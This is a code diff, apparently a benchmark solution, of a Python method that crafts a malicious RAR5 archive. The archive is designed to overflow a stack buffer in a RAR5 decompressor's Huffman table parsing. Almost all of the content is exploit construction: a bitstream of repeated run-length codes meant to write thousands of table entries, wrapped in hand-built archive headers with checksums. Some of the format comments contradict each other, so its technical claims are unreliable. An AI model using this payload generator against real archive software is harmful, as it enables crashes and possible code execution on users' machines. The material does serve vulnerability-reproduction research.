@@ -3,11 +3,7 @@ import zlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in RAR5 reader.
-        Targeting the Huffman table parsing logic where RLE checks are insufficient.
-        """
-        def to_varint(n):
+        def to_vint(n):
             out = bytearray()
             while True:
                 byte = n & 0x7F
@@ -20,61 +16,99 @@ class Solution:
                     break
             return bytes(out)
 
-        # 1. RAR5 Signature
-        sig = b"\x52\x61\x72\x21\x1A\x07\x01\x00"
-
-        # 2. Main Archive Header
-        # Type=1, Flags=0, Extra=0, Data=0
-        # Body: ArchFlags=0
-        mh_fields = to_varint(1) + to_varint(0) + to_varint(0)
-        mh_size = to_varint(len(mh_fields))
-        mh_crc = struct.pack('<I', zlib.crc32(mh_fields) & 0xFFFFFFFF)
-        main_header = mh_crc + mh_size + mh_fields
-
-        # 3. Payload (Compressed Data)
-        # We target the Pre-Code Huffman table (size 20).
-        # We craft a bitstream that writes 19 entries, then triggers a repeat code
-        # that writes well past the 20th entry, causing a stack buffer overflow.
+        # 1. Payload Generation
+        # Construct a malicious compressed stream that triggers a stack buffer overflow
+        # during Huffman table parsing. We exploit the RLE decoding logic.
         
-        # Bitstream construction (Little Endian):
-        # - 18 nibbles of '1' (entries 0-17) -> 9 bytes of 0x11
-        # - Nibble '1' (entry 18) and Nibble '15' (entry 19, code 15=repeat) -> 0xF1
-        # - Nibble '15' (count for repeat: 15+2=17 zeros) and Nibble '0' (padding) -> 0x0F
-        # Total written: 19 + 17 = 36 > 20.
+        bits = []
+        # "Table Present" flag = 1
+        bits.append(1)
         
-        bit_data = b'\x11' * 9 + b'\xF1\x0F'
-        bit_data += b'\x00' * 8  # Safe padding
+        # BitLength Table (Table C) - 20 entries of 4 bits each.
+        # We define a minimal Huffman tree:
+        # Index 0 (Val 0) -> Length 1
+        # Index 17 (Val 17, RLE Zero) -> Length 1
+        # All others -> Length 0
+        
+        # Index 0: Length 1 ('0001')
+        bits.extend([0, 0, 0, 1])
+        # Index 1-16: Length 0 ('0000')
+        for _ in range(16):
+            bits.extend([0, 0, 0, 0])
+        # Index 17: Length 1 ('0001')
+        bits.extend([0, 0, 0, 1])
+        # Index 18-19: Length 0 ('0000')
+        for _ in range(2):
+            bits.extend([0, 0, 0, 0])
+            
+        # Huffman Codes assigned:
+        # Val 0: Code 0
+        # Val 17: Code 1
+        
+        # Generate Main Table payload
+        # Repeatedly send Code 17 (bit 1) with max repeat count to overflow the table buffer.
+        # Code 17 implies "Repeat Zeros". It reads 3 bits for count.
+        # We send '1' (Code 17) followed by '111' (Count 7 -> 10 zeros).
+        # Repeating this ~1000 times writes ~10,000 entries, overflowing typical stack buffers (e.g., 256-512 bytes).
+        for _ in range(1000):
+            bits.append(1)
+            bits.extend([1, 1, 1])
 
-        # Inner Block Header in the compressed stream
-        # Flags: 0x80 (Table Present)
-        # Checksum: CRC32(Flags + SizeBytes) & 0xFF
-        # Size: VarInt(len(bit_data))
-        block_flags = b'\x80'
-        block_size_bytes = to_varint(len(bit_data))
-        
-        crc_data = block_flags + block_size_bytes
-        block_crc_val = zlib.crc32(crc_data) & 0xFF
-        block_checksum = struct.pack('B', block_crc_val)
-        
-        payload = block_flags + block_checksum + block_size_bytes + bit_data
+        # Pack bits into bytes (MSB first)
+        payload = bytearray()
+        curr_val = 0
+        curr_bits = 0
+        for b in bits:
+            if b:
+                curr_val |= (1 << (7 - curr_bits))
+            curr_bits += 1
+            if curr_bits == 8:
+                payload.append(curr_val)
+                curr_val = 0
+                curr_bits = 0
+        if curr_bits > 0:
+            payload.append(curr_val)
 
-        # 4. File Header
-        # Type=2, Flags=0x0001 (Has Data)
-        # Compression: Method 1 (Fastest) -> 0x01
-        # HostOS=0
-        # NameLen=1, Name='a'
-        # DataSize, UnpackedSize
-        fh_fields = to_varint(2) + to_varint(0x0001)
-        fh_fields += to_varint(0x01)
-        fh_fields += to_varint(0)
-        fh_fields += to_varint(1)
-        fh_fields += b'a'
-        fh_fields += to_varint(len(payload))
-        fh_fields += to_varint(len(payload)) # Unpacked size (arbitrary, using payload len)
+        # 2. Construct RAR5 Container
+        sig = b"\x52\x61\x72\x21\x1a\x07\x01\x00"
         
-        fh_size = to_varint(len(fh_fields))
-        fh_crc = struct.pack('<I', zlib.crc32(fh_fields) & 0xFFFFFFFF)
-        file_header = fh_crc + fh_size + fh_fields
-
-        # Combine all parts
+        # Main Header
+        # Format: CRC(4) | Size(V) | Type(V) | Flags(V)
+        mh_type = 1
+        mh_flags = 0
+        mh_content = to_vint(mh_type) + to_vint(mh_flags)
+        # Size includes Size field itself + Content + CRC(4)
+        # We assume Size fits in 1 byte vint (true for small headers)
+        mh_size_val = len(mh_content) + 1 + 4 
+        mh_size_bytes = to_vint(mh_size_val)
+        mh_data = mh_size_bytes + mh_content
+        mh_crc = zlib.crc32(mh_data) & 0xFFFFFFFF
+        main_header = struct.pack('<I', mh_crc) + mh_data
+        
+        # File Header
+        # Format: CRC(4) | Size(V) | Type(V) | Flags(V) | [DataSize] | Attr | CompInfo | HostOS | NameLen | Name
+        fh_type = 2
+        fh_flags = 0x0001 # Has Data
+        fh_data_size = len(payload)
+        fh_attr = 0
+        fh_comp_info = 0x20 # Method 4 (Normal) - Required to trigger Huffman parsing
+        fh_host_os = 0
+        fh_name = b"poc"
+        fh_name_len = len(fh_name)
+        
+        fh_content = to_vint(fh_flags) + \
+                     to_vint(fh_data_size) + \
+                     to_vint(fh_attr) + \
+                     to_vint(fh_comp_info) + \
+                     to_vint(fh_host_os) + \
+                     to_vint(fh_name_len) + \
+                     fh_name
+                     
+        fh_content_with_type = to_vint(fh_type) + fh_content
+        fh_size_val = len(fh_content_with_type) + 1 + 4
+        fh_size_bytes = to_vint(fh_size_val)
+        fh_data = fh_size_bytes + fh_content_with_type
+        fh_crc = zlib.crc32(fh_data) & 0xFFFFFFFF
+        file_header = struct.pack('<I', fh_crc) + fh_data
+        
         return sig + main_header + file_header + payload
